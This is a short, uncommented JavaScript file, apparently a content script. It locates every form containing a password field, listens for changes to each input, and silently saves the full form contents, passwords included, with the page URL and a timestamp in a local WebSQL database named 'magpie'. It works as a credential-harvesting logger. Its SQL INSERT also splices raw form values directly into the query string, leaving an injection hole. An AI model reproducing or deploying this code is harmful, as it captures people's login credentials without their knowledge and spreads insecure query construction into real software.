var authForms = getAuthForms();

authForms.forEach(function (form) {
  form.setAttribute("hash", hash());

  inputs = form.getElementsByTagName('input');
  for (var i = inputs.length - 1; i >= 0; i--) {
    inputs[i].addEventListener("change", function (e) {
      storeForm(form);
    });
  }
});

function storeForm(form) {
  var data = new FormData(form);
  var serializedData = {};
  for (var pair of data.entries()) {
    serializedData[pair[0]] = pair[1]; 
  }

  var dt = new Date();

  var db = openDatabase('magpie', '1.0', 'Magpie\'s nest', 2 * 1024 * 1024);
  db.transaction(function (tx) {
     tx.executeSql('CREATE TABLE IF NOT EXISTS entries (id VARCHAR PRIMARY KEY, url VARCHAR(255), data TEXT, submitted_at DATETIME)');
     tx.executeSql(`INSERT OR REPLACE INTO entries (id, url, data, submitted_at) VALUES ('${form.getAttribute('hash')}', '${window.location.href}','${JSON.stringify(serializedData)}', '${dt.toISOString()}')`);
  });
}

function getAuthForms() {
  var authForms = [];

  for (var f = document.forms.length - 1; f >= 0; f--) {
    var currentForm = document.forms[f];
    if(document.forms[f].querySelectorAll('[type=password]').length) {
      authForms.push(document.forms[f]);
    }
  }

  return authForms;
}

function hash(len) {
  if (len === undefined) len = 8;

  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (var i = 0; i < len; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}